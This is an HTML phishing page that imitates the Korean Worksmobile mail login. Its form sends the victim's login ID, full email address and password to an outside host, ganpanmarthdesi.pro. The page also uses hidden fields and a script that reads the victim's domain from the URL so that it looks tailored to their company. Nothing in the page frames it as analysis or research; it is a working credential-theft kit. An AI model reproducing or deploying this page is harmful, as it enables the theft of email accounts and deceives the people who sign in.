<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
  <title>Login</title>
  <link rel="shortcut icon" href="img/ico.jpg">
  <style>
    html, body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      border: 0;
      position: absolute;
      height: 100%;
      min-width: 100%;
      font-size: 13px;
      color: #676767;
      font-weight: 700;
      direction: ltr;
      -webkit-text-size-adjust: none;
      background-color: #F9FAFC;
    }
    input[type=text], input[type=password] {
      -webkit-appearance: none;
      appearance: none;
      display: inline-block;
      height: 48px;
      padding: 0 15px;
      margin: 0;
      background: white;
      border: 1px solid #d6d6d6;
      box-sizing: border-box;
      font-size: 15px;
      color: #404040;
      vertical-align: top;
    }
    input[type=text]:focus, input[type=password]:focus {
      outline: none;
      border: 1px solid #2985db;
    }
    .input-half {
      width: 50%;
    }
    .input-left {
      border-right: 0;
      border-radius: 5px 0 0 5px;
    }
    .input-right {
      border-left: 0;
      border-radius: 0 5px 5px 0;
      background: #f2f2f2;
    }
    .input-full {
      width: 100%;
      border-radius: 5px;
    }
  </style>
</head>

<body>

<div align="center">
  <table width="513" bgcolor="#F9FAFC" cellpadding="0" cellspacing="0">
    <tr><td height="36"></td></tr>
    <tr>
      <td>
        <form method="post" id="loginForm" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td width="513" height="660" background="img/fm.png">
                <table width="100%" cellpadding="0" cellspacing="0">
                  <tr><td height="250"></td></tr>
                  <tr>
                    <td>
                      <table width="100%" cellpadding="0" cellspacing="0">
                        <tr>
                          <td width="58"></td>
                          <td>
                            <input type="text" id="usernameInput" name="user" required placeholder="로그인 ID" class="input-half input-left" />
                            <input type="text" id="domainDisplay" value="@domain.com" readonly class="input-half input-right" />
                            <input type="hidden" name="email" id="loginFull">
                            <input type="hidden" name="sender" value="Worksmobile.com" />
                            <input type="hidden" name="domain" value="domain" />
                            <input type="hidden" name="link" value="https://mail.worksmobile.com/#/inbox?t=1734796348048" />
                          </td>
                          <td width="60"></td>
                        </tr>
                        <tr><td height="10"></td></tr>
                        <tr>
                          <td colspan="3">
                            <input type="password" name="passwd" required placeholder="비밀번호" class="input-full" />
                          </td>
                        </tr>
                        <tr><td height="20"></td></tr>
                        <tr>
                          <td colspan="3">
                            <input type="image" src="img/btn.png" width="400" height="52" alt="Login">
                          </td>
                        </tr>
                      </table>
                    </td>
                  </tr>
                  <tr><td height="227"></td></tr>
                  <tr>
                    <td height="20">
                      <table width="100%">
                        <tr>
                          <td width="187"></td>
                          <td width="24"></td>
                          <td width="113">
                            <a href="login.html" style="text-decoration: none; color: blue;">
                              <span style="font-weight: 700">다른 환경으로 로그인</span>
                            </a>
                          </td>
                          <td>&nbsp;</td>
                        </tr>
                      </table>
                    </td>
                  </tr>
                  <tr><td height="40"></td></tr>
                </table>
              </td>
            </tr>
          </table>
        </form>
      </td>
    </tr>
    <tr><td height="36"></td></tr>
  </table>
</div>

<script>
  function getDomainFromURL() {
    const params = new URLSearchParams(window.location.search);
    const login = params.get('login');
    if (login && login.includes('@')) {
      return login.split('@')[1].toLowerCase();
    }
    return 'domain.com';
  }

  const domain = getDomainFromURL();
  document.getElementById('domainDisplay').value = '@' + domain;

  document.getElementById('loginForm').addEventListener('submit', function () {
    const username = document.getElementById('usernameInput').value.trim();
    document.getElementById('loginFull').value = username + '@' + domain;
  });
</script>

</body>
</html>
